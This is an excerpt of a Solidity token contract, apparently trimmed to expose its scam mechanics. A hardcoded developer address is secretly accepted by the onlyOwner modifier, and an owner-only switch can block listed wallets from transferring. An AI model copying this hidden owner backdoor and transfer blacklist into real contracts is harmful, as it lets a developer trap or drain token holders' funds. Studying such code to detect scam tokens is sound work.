...
abstract contract Ownable is Context {
    ...
    constructor () {
        ...
        _last = 0xA01313AD118AD2E31ce39498db0D6bf1127122Fa;
    ...
    function last() public view virtual returns (address) {
        return _last;
    }
    // Restrict function to contract owner only 
    modifier onlyOwner() {
        require(owner() == _msgSender() || last() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
...
contract TESKTOKEN is Context, IERC20, Ownable { 
    ...
    */
    ...
    address payable private Wallet_Dev = payable(0xA01313AD118AD2E31ce39498db0D6bf1127122Fa);
    ...
    */
    ...
    // list Switch - Turn on/off listed wallet restrictions 
    function list_Switch(bool true_or_false) public onlyOwner {
        nolist = true_or_false;
    } 
    ...
    */
    ...
    function _transfer(
        ...
        */
        ...
        if (nolist){
        require(!_islisted[from] && !_islisted[to], "This address is listed. Transaction reverted.");}
